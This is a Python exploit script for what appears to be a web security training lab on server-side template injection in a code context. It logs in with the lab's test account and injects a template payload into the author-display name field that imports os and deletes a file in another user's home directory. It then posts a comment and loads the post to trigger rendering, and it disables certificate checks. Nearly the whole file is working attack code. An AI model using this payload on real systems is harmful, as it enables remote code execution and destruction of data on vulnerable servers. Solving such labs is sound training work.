#!/usr/bin/env python3
import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin

CHANGE_NAME_PATH = "/my-account/change-blog-post-author-display"
DELETE_FILENAME = "/home/carlos/morale.txt"
USERNAME = "wiener"
PASSWORD = "peter"
POST_ID = 1
COMMENT = "Hello, world!"

def log_in(session: requests.Session, base_url: str, csrf_token: str):

    login_url = urljoin(base_url, "/login")
    data = {
        "csrf": csrf_token,
        "username": USERNAME,
        "password": PASSWORD
    }

    r = session.post(login_url, data=data, timeout=10)  # Be careful json=data not data=data
    r.raise_for_status()
    return r

def get_csrf_from_html(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if not token or not token.get("value"):
        raise RuntimeError("CSRF token not found on forgot-password page.")
    return token["value"]

def changed_preferred_name(sess: requests.Session, base_url: str, csrf_token: str, payload: str):
    """Send a GET request with a payload to display the message."""
    changename_url = urljoin(base_url, CHANGE_NAME_PATH)
    data = {
        "blog-post-author-display": payload,
        "csrf": csrf_token
    }

    r = sess.post(changename_url, data=data, timeout=10, verify=False)
    r.raise_for_status()
    return r

def visit_post(sess: requests.Session, base_url: str, post_id: int):
    url = urljoin(base_url, f"/post?postId={post_id}")

    r = sess.get(url, timeout=10)
    r.raise_for_status()
    return r

def post_comment(sess: requests.Session, base_url: str, csrf_token: str, post_id: int, comment: str):
    url = urljoin(base_url, f"/post/comment")
    data = {
        "csrf": csrf_token,
        "postId": post_id,
        "comment": comment
    }

    r = sess.post(url, data=data, timeout=10, verify=False)
    r.raise_for_status()
    return r

def main():
    requests.packages.urllib3.disable_warnings()
    parser = argparse.ArgumentParser(
        description="Lab: Basic server-side template injection (code context)"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    sess = requests.Session()

    print(f"[*] Base URL: {base_url}")

    # Step 1: Go to the root page "/" to extract CSRF token
    print(f"[*] Extracting csrf token to log in...\n")
    r = sess.get(base_url + "/login", timeout=10)
    csrf_token = get_csrf_from_html(r.text)
    print(f"[*] csrf token {csrf_token} extracted\n")

    # Step 2: Log in, get session, extract CSRF token
    print(f"[*] Logging in with {USERNAME}:{PASSWORD}...\n")
    r = log_in(sess, base_url, csrf_token)
    csrf_token = get_csrf_from_html(r.text)
    print(f"[*] Logged in as {USERNAME}, csrf token {csrf_token} extracted\n")

    # Step 3: Confirm vulnerability exists by sending a payload with mathematical operation 8*8
    # TODO

    # Step 4: Delete the required file
    print(f"[*] Performing attack. Sending payload changing template to {DELETE_FILENAME}...\n")
    payload = f'user.nickname}}}}{{%import os%}}{{{{os.remove("{DELETE_FILENAME}")'
    changed_preferred_name(sess, base_url, csrf_token, payload)
    print(f"[*] Payload sent\n")

    # Step 5: Post a comment to change template
    print(f"[*] Posting a comment {COMMENT} to the postId {POST_ID}...\n")
    post_comment(sess, base_url, csrf_token, POST_ID, COMMENT)
    print(f"[*] Comment posted\n")

    # Step 6: Visit the post with a comment to trigger template rendering
    print(f"[*] Visiting a post to trigger template rendering...\n")
    visit_post(sess, base_url, POST_ID)
    print(f"[*] File {DELETE_FILENAME} removed\n")


    print("\n[+] Attack finished. See Lab solved.")


if __name__ == "__main__":
    main()